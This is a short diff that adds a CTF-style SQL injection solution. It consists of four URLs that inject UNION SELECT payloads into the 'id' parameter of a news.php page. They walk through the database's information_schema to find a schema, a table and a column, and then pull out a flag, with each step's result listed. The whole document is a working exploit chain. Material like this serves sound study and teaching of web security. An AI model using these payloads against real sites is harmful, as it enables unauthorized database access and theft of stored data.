@@ -1,0 +1,7 @@
+http://kaibro.tw:9527/news.php?id=-1 UNION SELECT 1, 2, schema_name FROM information_schema.schemata limit 1,1 ==> 'fl4g'
+
+http://kaibro.tw:9527/news.php?id=-1 UNION SELECT 1, 2, table_name FROM information_schema.tables WHERE table_schema='fl4g' ==> secret
+
+http://kaibro.tw:9527/news.php?id=-1 UNION SELECT 1, 2, column_name FROM information_schema.columns WHERE table_name='secret' limit 1,1 ==> THIS_IS_FLAG_YO
+
+http://kaibro.tw:9527/news.php?id=-1 UNION SELECT 1, 2, THIS_IS_FLAG_YO from fl4g.secret
